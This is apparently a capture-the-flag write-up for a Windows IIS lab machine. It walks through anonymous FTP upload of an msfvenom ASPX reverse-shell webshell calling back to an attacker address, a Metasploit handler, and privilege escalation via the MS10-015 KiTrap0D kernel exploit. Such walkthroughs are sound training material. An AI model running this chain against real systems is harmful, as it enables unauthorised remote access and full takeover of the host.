nmap result:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
```

Use ftp to connect

```
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

We can find the path `/aspnet_client/system_web/2_0_50727/`.

We can also put webshell to web directory through ftp. 

Use msfvenom to generate webshell:

```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f aspx -o /Users/par1st0nh1ll/Desktop/htb/writeups/windows/exp/shell.aspx
```

Upload the generated reverse webshell at the current folder.

```
lcd /Users/par1st0nh1ll/Desktop/htb/writeups/windows/exp
put ./shell.aspx
```

Use meterpreter to listen for reverse shell connection.

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.2
set LPORT 4444
set ExitOnSession false
exploit -j
```

Visit `http://10.10.10.5/shell.aspx` and you will see a new session is established.

Connect to the session, but it requires privelege escalation to read flags.

```
sessions -i 1
```

Collect systeminfo message and write to systeminfo.txt

```
c:\Users>systeminfo
```

Use [wesng](https://github.com/bitsadmin/wesng) to search for vulnerabilities. 

```
// Download latest definitions
wes.py -u 
// Determine vulnerabilities
python3 wes.py -e ./systeminfo.txt 
```

Find a privilege escalation vulnerability:

```
Date: 20100209
CVE: CVE-2010-0232
KB: KB977165
Title: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege
Affected product: Windows 7 for 32-bit Systems
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: http://www.securityfocus.com/bid/37864, http://lock.cmpxchg8b.com/c0af0967d904cef2ad4db766a00bc6af/KiTrap0D.zip
```

[MS10-015](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-015) has a metasploit module `exploit/windows/local/ms10_015_kitrap0d`

Run this module and you can gain `nt authority\system` privelege.